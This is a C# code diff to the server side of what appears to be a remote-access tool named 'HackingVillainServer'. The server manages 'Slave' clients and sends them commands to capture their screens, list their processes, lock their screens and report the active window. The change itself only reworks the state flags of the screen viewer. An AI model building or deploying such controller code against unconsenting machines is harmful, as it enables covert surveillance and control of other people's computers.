@@ -21,6 +21,7 @@ namespace HackingVillainServer
         ISocket _server;
         private List<Slave> _clients = new List<Slave>();
         Thread _listen;
+        bool _ViewrClosed = true;
         public Form1()
         {
             InitializeComponent();
@@ -124,6 +125,7 @@ namespace HackingVillainServer
                     var img = Image.FromStream(ms);
                     if (viewer != null)
                     {
+                        if (_ViewrClosed) return;
                         viewer.BackgroundImage = img;
                         if (!viewer.Visible)
                             viewer.Show();
@@ -131,6 +133,7 @@ namespace HackingVillainServer
                     else
                     {
                         viewer = new ScreenViewer(img);
+                        _ViewrClosed = false;
 
                         viewer.FormClosing += (b, d) =>
                         {
@@ -138,6 +141,7 @@ namespace HackingVillainServer
                             viewer.Hide();
                             this.Invoke(new MethodInvoker(() =>
                             {
+                                _ViewrClosed = true;
                                 Send("Stop Showing");
                             }));
                         };
@@ -194,31 +198,24 @@ namespace HackingVillainServer
                 return;
             Send("Lock Screen");
         }
-
-        bool _readyForProcess = false;
+        
         private void 프로세스ToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count != 1)
                 return;
-            _readyForProcess = true;
             Send("Show Me The Process");
         }
-
-        bool _readyForSize = false;
-        bool _readyForScreen = false;
+        
         private void 화면SToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count != 1)
                 return;
-            _readyForSize = true;
-            _readyForScreen = true;
             Send("Show Me The Screen");
+            _ViewrClosed = false;
         }
-
-        bool _readyForWindow;
+        
         private void timer1_Tick(object sender, EventArgs e)
         {
-            _readyForWindow = true;
             Send("Current Window");
         }
 
